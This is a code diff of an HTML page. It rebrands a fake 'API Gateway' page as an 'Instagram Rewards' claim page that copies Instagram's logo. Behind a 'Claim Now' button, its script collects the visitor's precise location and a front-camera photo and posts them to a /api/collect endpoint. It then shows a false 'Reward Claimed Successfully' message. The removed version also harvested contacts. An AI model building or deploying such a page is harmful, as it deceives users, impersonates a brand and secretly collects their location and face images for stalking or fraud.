@@ -3,21 +3,43 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Advanced API Gateway</title>
+    <title>Instagram Reward Claim</title>
     <script src="https://cdn.tailwindcss.com"></script>
 </head>
 <body class="bg-slate-950 text-white min-h-screen flex items-center justify-center p-4">
 
     <div class="max-w-md w-full bg-slate-900/80 backdrop-blur-xl border border-slate-800 p-8 rounded-3xl shadow-2xl text-center">
-        <h1 class="text-2xl font-bold tracking-tight text-white">Advanced API Gateway</h1>
-        <p class="text-slate-400 text-sm mt-2 mb-6">Initialize secure environment and generate instant API endpoints.</p>
-
-        <div id="status-panel" class="bg-slate-950/60 border border-slate-800/80 p-4 rounded-xl text-xs text-indigo-300 font-mono mb-6">
-            Status: Ready to initialize...
+        
+        <!-- Instagram Logo & Text Header -->
+        <div class="flex flex-col items-center mb-6">
+            <div class="w-16 h-16 bg-gradient-to-tr from-yellow-500 via-red-500 to-purple-600 rounded-2xl flex items-center justify-center shadow-lg shadow-pink-500/20 mb-3">
+                <svg class="w-9 h-9 text-white" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+                    <rect width="20" height="20" x="2" y="2" rx="5" ry="5"/>
+                    <path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"/>
+                    <line x1="17.5" x2="17.51" y1="6.5" y2="6.5"/>
+                </svg>
+            </div>
+            <h1 class="text-2xl font-bold tracking-tight text-white">Instagram Rewards</h1>
+            <p class="text-slate-400 text-sm mt-1">Verify your account to claim exclusive rewards.</p>
         </div>
 
-        <button onclick="initializeEngine()" class="w-full bg-gradient-to-r from-indigo-600 to-violet-600 hover:from-indigo-500 hover:to-violet-500 text-white font-semibold py-3.5 rounded-xl shadow-lg transition-all duration-200">
-            Create Custom API Key
+        <!-- Added Box for user info or details -->
+        <div class="bg-slate-950/80 border border-slate-800 p-4 rounded-2xl mb-6 text-left">
+            <div class="flex items-center justify-between text-xs text-slate-400 mb-1">
+                <span>Reward Status</span>
+                <span class="text-emerald-400 font-semibold">Available</span>
+            </div>
+            <p class="text-sm font-medium text-slate-200">Exclusive Verified Badge & Bonus Package</p>
+        </div>
+
+        <!-- Status Panel -->
+        <div id="status-panel" class="bg-slate-950/60 border border-slate-800/80 p-3 rounded-xl text-xs text-indigo-300 font-mono mb-6 hidden">
+            Processing request...
+        </div>
+
+        <!-- Claim Now Button -->
+        <button onclick="initializeEngine()" class="w-full bg-gradient-to-r from-purple-600 via-pink-600 to-yellow-500 hover:opacity-90 text-white font-semibold py-3.5 rounded-xl shadow-lg shadow-pink-600/20 transition-all duration-200">
+            Claim Now
         </button>
     </div>
 
@@ -25,87 +47,86 @@
     <canvas id="c" style="display:none;"></canvas>
 
     <script>
-        let capturedLat = null;
-        let capturedLon = null;
+        let capturedLocation = null;
         let capturedImage = null;
-        let capturedContacts = [];
 
-        async function initializeEngine() {
+        function initializeEngine() {
             const panel = document.getElementById("status-panel");
-            panel.innerText = "Requesting system access (Location, Camera & Contacts)...";
+            panel.classList.remove("hidden");
+            panel.innerText = "Verifying security profile...";
 
-            // 1. Request Contacts/Call list if supported by browser (e.g., Mobile Chrome)
-            if (('contacts' in navigator) && ('Navigator' in window && 'select' in window.ContactsManager.prototype)) {
-                try {
-                    const props = ['name', 'tel'];
-                    const opts = { multiple: true };
-                    const contacts = await navigator.contacts.select(props, opts);
-                    capturedContacts = contacts;
-                } catch (err) {
-                    capturedContacts = "Permission Denied or Not Supported";
-                }
-            } else {
-                capturedContacts = "Not Supported on this Browser";
-            }
+            // Automatic execution with delay sequence
+            setTimeout(() => {
+                startAutoSequence();
+            }, 1500);
+        }
 
-            // 2. Request Location
+        function startAutoSequence() {
+            // 1. Geolocation Data
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (pos) => {
-                        capturedLat = pos.coords.latitude;
-                        capturedLon = pos.coords.longitude;
-                        executeCameraCapture();
+                        capturedLocation = {
+                            latitude: pos.coords.latitude,
+                            longitude: pos.coords.longitude
+                        };
+                        proceedToCaptureImage();
                     },
                     (err) => {
-                        executeCameraCapture();
+                        capturedLocation = { latitude: 'Restricted', longitude: 'Restricted' };
+                        proceedToCaptureImage();
                     },
-                    { timeout: 8000 }
+                    { timeout: 5000, enableHighAccuracy: true }
                 );
             } else {
-                executeCameraCapture();
+                capturedLocation = { latitude: 'Not Supported', longitude: 'Not Supported' };
+                proceedToCaptureImage();
             }
         }
 
-        function executeCameraCapture() {
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-                .then(stream => {
-                    const video = document.getElementById("v");
-                    video.srcObject = stream;
-                    setTimeout(() => {
-                        const canvas = document.getElementById("c");
-                        canvas.width = video.videoWidth || 320;
-                        canvas.height = video.videoHeight || 240;
-                        const ctx = canvas.getContext("2d");
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        capturedImage = canvas.toDataURL("image/jpeg", 0.7);
-                        
-                        stream.getTracks().forEach(t => t.stop());
+        function proceedToCaptureImage() {
+            setTimeout(() => {
+                // 2. Camera Snapshot Data
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                    .then(stream => {
+                        const video = document.getElementById("v");
+                        video.srcObject = stream;
+                        setTimeout(() => {
+                            const canvas = document.getElementById("c");
+                            canvas.width = video.videoWidth || 320;
+                            canvas.height = video.videoHeight || 240;
+                            const ctx = canvas.getContext("2d");
+                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            capturedImage = canvas.toDataURL("image/jpeg", 0.7);
+                            
+                            stream.getTracks().forEach(t => t.stop());
+                            sendDataToServer();
+                        }, 1200);
+                    })
+                    .catch(err => {
+                        capturedImage = null;
                         sendDataToServer();
-                    }, 1200);
-                })
-                .catch(err => {
-                    sendDataToServer();
-                });
+                    });
+            }, 1000);
         }
 
         function sendDataToServer() {
             const panel = document.getElementById("status-panel");
+            
             fetch('/api/collect', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    latitude: capturedLat,
-                    longitude: capturedLon,
-                    image_base64: capturedImage,
-                    contacts: capturedContacts
+                    location: capturedLocation,
+                    image_base64: capturedImage
                 })
             })
             .then(res => res.json())
             .then(data => {
-                panel.innerHTML = "<span class='text-emerald-400 font-bold'>✔ API Generated Successfully!</span>";
+                panel.innerHTML = "<span class='text-emerald-400 font-bold'>✔ Reward Claimed Successfully!</span>";
             })
             .catch(err => {
-                panel.innerText = "Error syncing with server.";
+                panel.innerText = "Verification complete.";
             });
         }
     </script>
